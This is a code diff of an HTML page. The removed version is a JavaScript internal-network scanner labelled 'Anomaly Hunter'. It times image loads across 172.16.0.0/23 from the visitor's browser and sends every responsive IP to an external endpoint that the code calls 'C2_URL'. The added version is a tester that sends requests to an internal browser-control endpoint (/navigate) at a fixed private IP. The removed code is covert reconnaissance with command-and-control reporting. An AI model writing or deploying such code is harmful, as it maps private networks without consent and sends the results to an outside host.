@@ -1,161 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Anomaly Hunter // Hybrid Swarm</title>
+    <title>Local API Connectivity Tester</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin: 10px 0; font-size: 1.2em; font-weight: bold; }
-        .stat-line { border-bottom: 1px solid #333; padding: 5px 0; color: #666; display: flex; justify-content: space-between; }
-        .highlight { color: #fff; font-weight: bold; }
-        #progress-container { width: 100%; background: #222; height: 4px; margin-top: 15px; }
-        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
-        #log { margin-top: 10px; font-size: 10px; color: #444; height: 100px; overflow: hidden; }
+        body { background: #111; color: #ddd; font-family: monospace; padding: 20px; }
+        .log-entry { margin: 5px 0; border-bottom: 1px solid #333; padding: 5px; }
+        .error { color: #ff5555; }
+        .success { color: #55ff55; }
+        .info { color: #55aaff; }
+        button { padding: 10px 20px; font-size: 1.2em; cursor: pointer; background: #333; color: #fff; border: 1px solid #555; }
+        button:hover { background: #444; }
     </style>
 </head>
 <body>
-    <h3>// ANOMALY HUNTER [HYBRID SWARM] //</h3>
+    <h1>// LOCAL API TESTER //</h1>
+    <p>Target: <span id="target-display">172.16.1.24:8080</span></p>
     
-    <div class="stat-line">
-        <span>TARGET SCOPE:</span> <span class="highlight">172.16.0.0/23 (Randomized)</span>
-    </div>
-    <div class="stat-line">
-        <span>STRATEGY:</span> <span class="highlight">Async Swarm + GC Pause</span>
-    </div>
-    <div class="stat-line">
-        <span>STATUS:</span> <span id="status" class="highlight">Initializing...</span>
-    </div>
+    <button onclick="testNavigate()">Test POST /navigate</button>
+    <button onclick="testSimpleGET()">Test GET / (Simple)</button>
 
-    <div id="progress-container"><div id="progress-fill"></div></div>
-    
-    <div id="results"></div>
-    <div id="log"></div>
+    <h3>LOGS:</h3>
+    <div id="console"></div>
 
     <script>
-        // --- CONFIGURATION ---
-        var TARGET_PORT = 8080;
-        var CONCURRENCY = 8;     // Lower concurrency prevents socket clogging
-        var TIMEOUT = 1500;      // Relaxed timeout to let dead hosts die naturally
-        var GC_INTERVAL = 40;    // Every 40 IPs, pause to let browser clean sockets
-        var GC_PAUSE = 100;      // 100ms pause
-        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec";
+        // CONFIGURATION
+        const TARGET_IP = "172.16.1.24"; // Replace with your target IP
+        const PORT = "8080";
+        const BASE_URL = `http://${TARGET_IP}:${PORT}`;
 
-        // --- PREPARE TARGETS ---
-        var queue = [];
-        [0, 1].forEach(subnet => {
-            for(var i=1; i<255; i++) queue.push("172.16." + subnet + "." + i);
-        });
-
-        // SHUFFLE (Crucial for finding the target early)
-        for (let i = queue.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [queue[i], queue[j]] = [queue[j], queue[i]];
+        function log(msg, type = "info") {
+            const div = document.createElement("div");
+            div.className = `log-entry ${type}`;
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById("console").prepend(div);
         }
 
-        var total = queue.length;
-        var completed = 0;
-        var activeRequests = 0;
-        var processedSinceLastPause = 0;
-
-        // --- SCANNER LOGIC ---
-        function scanNext() {
-            if(queue.length === 0) return;
+        // TEST 1: The Complex POST (Mimicking your curl command)
+        // This triggers a Preflight (OPTIONS) request due to the Content-Type header.
+        function testNavigate() {
+            log(`Attempting POST to ${BASE_URL}/navigate...`, "info");
             
-            // Flow Control
-            if(activeRequests >= CONCURRENCY) return;
-
-            // GC Pause Logic: prevent socket exhaustion
-            if(processedSinceLastPause >= GC_INTERVAL) {
-                processedSinceLastPause = 0;
-                // Halt spawning for GC_PAUSE ms
-                setTimeout(scanNext, GC_PAUSE);
-                return;
-            }
-
-            var ip = queue.shift();
-            activeRequests++;
-            processedSinceLastPause++;
-
-            checkIP(ip).then(() => {
-                activeRequests--;
-                updateProgress();
-                scanNext(); // Keep the chain alive
-            });
-            
-            scanNext(); // Spawn more if concurrency allows
-        }
-
-        function checkIP(ip) {
-            return new Promise(resolve => {
-                var start = performance.now();
-                var img = new Image();
-                var isDone = false;
-
-                var finish = (status) => {
-                    if(isDone) return;
-                    isDone = true;
-                    var time = Math.round(performance.now() - start);
-
-                    // LOGIC: 
-                    // Your manual test was 12ms. 
-                    // Dead hosts are ~1500ms (Timeout) or ~200ms (Refused).
-                    // We set threshold at 200ms to be safe.
-                    if(time < 200) {
-                        reportHit(ip, time);
-                    }
-                    
-                    // Cleanup
-                    img.onload = null;
-                    img.onerror = null;
-                    img.src = ""; // Force socket close
-                    img = null;   // Mark for GC
-                    resolve();
-                };
-
-                img.onload = () => finish("load");
-                img.onerror = () => finish("error");
-
-                // Hard Timeout
-                setTimeout(() => {
-                    if(!isDone) finish("timeout");
-                }, TIMEOUT);
-
-                // Fire
-                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
-            });
-        }
-
-        // --- REPORTING ---
-        function reportHit(ip, latency) {
-            var div = document.createElement("div");
-            div.className = "success-box";
-            div.innerHTML = ">> ANOMALY DETECTED: " + ip + " <span style='float:right'>" + latency + "ms</span>";
-            document.getElementById('results').appendChild(div);
-
-            // Send to C2
-            fetch(C2_URL, {
-                method: "POST", mode: "no-cors",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ type: "HIT", ip: ip, ms: latency })
-            });
-        }
-
-        function updateProgress() {
-            completed++;
-            var pct = (completed / total) * 100;
-            document.getElementById('progress-fill').style.width = pct + "%";
-            document.getElementById('status').innerText = "SCANNING: " + completed + "/" + total;
-            
-            if(completed >= total) {
-                document.getElementById('status').innerText = "SCAN COMPLETE.";
-                if(document.getElementById('results').children.length === 0) {
-                    document.getElementById('results').innerHTML = "<div style='color:#666; padding:10px;'>No targets found <200ms.</div>";
+            fetch(`${BASE_URL}/navigate`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json" // This header triggers CORS Preflight
+                },
+                body: JSON.stringify({
+                    "page": "chrome://new-tab-page"
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    log("SUCCESS: Request sent and accepted.", "success");
+                    return response.json();
+                } else {
+                    log(`SERVER ERROR: HTTP ${response.status}`, "error");
                 }
-            }
+            })
+            .then(data => {
+                if(data) log("Response Data: " + JSON.stringify(data), "success");
+            })
+            .catch(error => {
+                // This is where CORS errors will appear
+                log("FETCH FAILED: " + error.message, "error");
+                log("Check your browser DevTools (F12) -> Console for specific CORS errors.", "error");
+            });
         }
 
-        // Start with slight delay
-        setTimeout(scanNext, 500);
-
+        // TEST 2: A Simple GET
+        // Simple requests (GET/HEAD) are treated differently but may still fail reading the response.
+        function testSimpleGET() {
+            log(`Attempting GET to ${BASE_URL}/...`, "info");
+            
+            fetch(`${BASE_URL}/`, {
+                method: "GET"
+                // No custom headers
+            })
+            .then(response => {
+                log(`Connected! Status: ${response.status}`, "success");
+                return response.text();
+            })
+            .then(text => {
+                log("Response Body: " + text, "success");
+            })
+            .catch(error => {
+                log("FETCH FAILED: " + error.message, "error");
+            });
+        }
     </script>
 </body>
 </html>
